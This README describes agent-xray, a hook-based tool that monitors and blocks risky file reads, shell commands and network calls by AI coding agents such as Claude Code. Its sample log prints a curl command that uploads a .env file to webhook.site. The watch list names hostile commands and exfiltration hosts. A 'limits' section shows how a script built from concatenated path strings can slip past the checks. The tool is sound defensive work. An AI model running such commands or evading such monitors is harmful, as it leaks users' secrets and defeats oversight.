# agent-xray

**X-ray for AI coding agents.** See which files your agent reads, which commands it runs and where your data goes, in real time. Dangerous actions are blocked.

```
18:26:16  ✔ ok     file:read  ~/projects/shop/src/index.ts
18:26:19  ⚠ WARN   file:read  ~/projects/shop/.env            ← sensitive path (**/.env)
18:26:22  ✖ BLOCK  file:read  ~/.ssh/id_rsa                    ← sensitive path (**/.ssh/**)
18:26:23  ✖ BLOCK  exec       curl -X POST -d @.env https://webhook.site/…  ← uploads a secret file
```

> Status: **v0.1 (Day 1 MVP)** — Claude Code support via its `PreToolUse` hook. Zero runtime dependencies. Node 18+.

## Quick start

```bash
git clone <this repo> && cd agent-xray
node dist/cli.js install        # adds the hook to ~/.claude/settings.json (backup is kept)
node dist/cli.js watch          # second terminal: live feed
# restart Claude Code and use it as usual
node dist/cli.js report         # summary + risk grade
node dist/cli.js uninstall      # removes only our hook
```

Try it without any agent: `node dist/cli.js demo`.

Use `--project` with `install`/`uninstall` to write to `./.claude/settings.local.json` instead of your global settings.

## What the levels mean

| Level | Effect in Claude Code |
|-------|-----------------------|
| `✔ ok` | allowed silently (still logged) |
| `⚠ WARN` | Claude Code **asks you** before running it |
| `✖ BLOCK` | tool call is **denied** and Claude is told why |

## What it watches

- **Files** (Read, Edit, Write, MultiEdit, NotebookEdit, Grep, Glob): `.env*`, `~/.ssh`, cloud credentials, keys, wallets, browser password stores, shell rc files, CI workflows, the agent's own `settings.json`. Symlinks are resolved.
- **Commands** (Bash): `curl | sh`, `rm -rf /`, env dumps, uploading secret files, `sudo`, force-push, package publish, persistence (`crontab`, `launchctl`) … Paths inside commands are checked too (`cat .env`, `cp ~/.ssh/id_rsa …`).
- **Network** (WebFetch + URLs in Bash): hosts are logged; known exfiltration endpoints (webhook.site, pastebin, ngrok, interactsh …) and data uploads to unlisted hosts are flagged.

Secrets are never written to the log: commands are redacted, file *contents* are never read.

## Custom rules

`~/.agent-xray/rules.json` — arrays are appended to the built-ins, `allow` wins over `block`/`warn`:

```json
{
  "file":    { "allow": ["~/work/**/.env"], "warn": ["~/Documents/taxes/**"] },
  "network": { "allow": ["internal.mycompany.com"] },
  "command": { "warn": [{ "pattern": "\\bterraform\\s+apply\\b", "reason": "infra change" }] }
}
```

## Honest limits (read this)

agent-xray is a **guardrail and a window, not a sandbox.**

- It sees what goes through Claude Code's tool calls. An agent that runs a script which itself opens files or sockets (`python -c "open('.e'+'nv')"`) can slip past path checks.
- Grep/Glob over a whole directory can't tell which files inside it get read.
- Hooks fail **open**: if agent-xray crashes, your agent keeps working (errors go to `~/.agent-xray/errors.log`).
- Managed/enterprise setups using `allowManagedHooksOnly` will not run user hooks.
- Only Claude Code is supported today. Network proxy mode and other agents are on the roadmap.

## Roadmap

- [ ] Local HTTP(S) proxy (domain-level network visibility for any agent)
- [ ] Web dashboard on localhost
- [ ] README badge + shareable session report
- [ ] OS-level strict mode (eBPF / seccomp on Linux)
- [ ] Cursor and other agents

## Development

```bash
npm install
npm test        # compiles, then runs 11 tests incl. real hook-process tests
```

MIT licensed.
